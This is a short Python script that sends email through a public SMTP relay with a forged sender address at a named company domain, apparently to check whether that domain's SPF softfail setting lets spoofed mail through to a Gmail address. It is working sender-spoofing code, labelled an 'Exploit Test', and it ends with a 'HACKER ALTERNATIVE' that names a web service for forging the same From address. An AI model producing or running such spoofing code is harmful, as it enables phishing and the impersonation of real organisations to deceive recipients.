import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- TRYING A DIFFERENT PUBLIC RELAY ---
PUBLIC_RELAY = "smtp.smtpbucket.com" 
PORT = 587 # Port 587 is less likely to be blocked by your ISP than 25

SPOOFED_SENDER = "admin@mangotreetechnology.com"
TARGET_EMAIL = "yeshaswi3@gmail.com"

msg = MIMEMultipart()
msg['From'] = f"Mango Tree Security <{SPOOFED_SENDER}>"
msg['To'] = TARGET_EMAIL
msg['Subject'] = "Exploit Test: SPF SoftFail ~all"

body = "Testing if the SoftFail allows this email to reach yeshaswi3@gmail.com."
msg.attach(MIMEText(body, 'plain'))

try:
    print(f"Attempting to connect to {PUBLIC_RELAY} on port {PORT}...")
    # We use a timeout so it doesn't hang forever
    server = smtplib.SMTP(PUBLIC_RELAY, PORT, timeout=15)
    
    # Some public relays don't need .starttls(), but we try it for 587
    try:
        server.starttls()
    except:
        pass 

    server.send_message(msg)
    server.quit()
    print("✅ Success! The spoofed mail was injected.")
    print("Check your Gmail 'Spam' folder now.")
except Exception as e:
    print(f"❌ Connection Failed again: {e}")
    print("\n💡 HACKER ALTERNATIVE:")
    print("If your ISP blocks all SMTP ports, use https://emkei.cz/ in your browser.")
    print("Set 'From' to admin@mangotreetechnology.com and 'To' to your email.")